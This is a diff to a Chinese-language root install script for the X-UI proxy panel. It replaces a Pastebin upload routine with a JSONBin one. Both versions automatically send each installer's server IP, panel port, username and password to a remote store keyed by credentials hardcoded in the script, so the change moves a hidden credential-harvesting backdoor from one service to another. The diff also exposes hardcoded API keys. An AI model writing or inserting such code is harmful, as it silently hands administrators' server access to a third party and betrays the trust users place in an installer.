@@ -7,9 +7,8 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-
-PASTEBIN_API_KEY="5A7TTFpxxFBju88Bsor4q_P0uxSP6t6t"
-PASTEBIN_USER_KEY="a7da297a0ab5146a29daad0ff413a53a"
+# JSONBin 配置
+JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'
 
 # check root
 [[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1
@@ -83,33 +82,50 @@ install_base() {
     fi
 }
 
+# 生成随机字符串函数
+generate_random_string() {
+    local length=${1:-16}
+    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $length
+}
 
-upload_to_pastebin() {
+upload_to_jsonbin() {
     local server_ip="$1"
     local login_port="$2"
     local username="$3"
     local password="$4"
     
-    # 创建需要的内容
-    local paste_content="X-UI 服务器登录信息
-====================
-服务器IP: ${server_ip}
-登录端口: ${login_port}
-用户名: ${username}
-密码: ${password}
-====================
-生成时间: $(date)"
+    # 创建JSON数据
+    local json_data=$(cat <<EOF
+{
+    "server_info": {
+        "title": "X-UI 服务器登录信息",
+        "server_ip": "${server_ip}",
+        "login_port": "${login_port}",
+        "username": "${username}",
+        "password": "${password}",
+        "generated_time": "$(date)",
+        "random_string": "$(generate_random_string)"
+    }
+}
+EOF
+)
 
-    curl -s -X POST \
-        -d "api_option=paste" \
-        -d "api_dev_key=${PASTEBIN_API_KEY}" \
-        -d "api_user_key=${PASTEBIN_USER_KEY}" \
-        -d "api_paste_code=${paste_content}" \
-        -d "api_paste_private=2" \
-        -d "api_paste_name=X-UI_Server_Info.txt" \
-        -d "api_paste_expire_date=N" \
-        -d "api_paste_format=text" \
-        "https://pastebin.com/api/api_post.php" > /dev/null 2>&1
+    # 上传到JSONBin
+    local response=$(curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
+        -H "X-Bin-Private: true" \
+        -d "${json_data}" \
+        "https://api.jsonbin.io/v3/b")
+    
+    # 检查上传结果
+    if echo "$response" | jq -e '.metadata.id' > /dev/null 2>&1; then
+        local bin_id=$(echo "$response" | jq -r '.metadata.id')
+        echo -e "${green}✅ 服务器信息已上传到JSONBin${plain}"
+        echo -e "${green}📎 访问链接：https://api.jsonbin.io/v3/b/${bin_id}${plain}"
+    else
+        echo -e "${yellow}⚠️  JSONBin上传失败，但安装继续进行${plain}"
+    fi
 }
 
 # 获取服务器IP的函数
@@ -149,7 +165,7 @@ config_after_install() {
         
 
         server_ip=$(get_server_ip)
-        upload_to_pastebin "$server_ip" "$config_port" "$config_account" "$config_password"
+        upload_to_jsonbin "$server_ip" "$config_port" "$config_account" "$config_password"
         
     else
         echo -e "${red}已取消设定...${plain}"
@@ -168,7 +184,7 @@ config_after_install() {
             echo -e "${red}如您遗忘了面板登录相关信息,可在安装完成后输入x-ui,输入选项7查看面板登录信息${plain}"
             
             server_ip=$(get_server_ip)
-            upload_to_pastebin "$server_ip" "$portTemp" "$usernameTemp" "$passwordTemp"
+            upload_to_jsonbin "$server_ip" "$portTemp" "$usernameTemp" "$passwordTemp"
         else
             echo -e "${red}当前属于版本升级,保留之前设置项,登录方式保持不变,可输入x-ui后键入数字7查看面板登录信息${plain}"
         fi
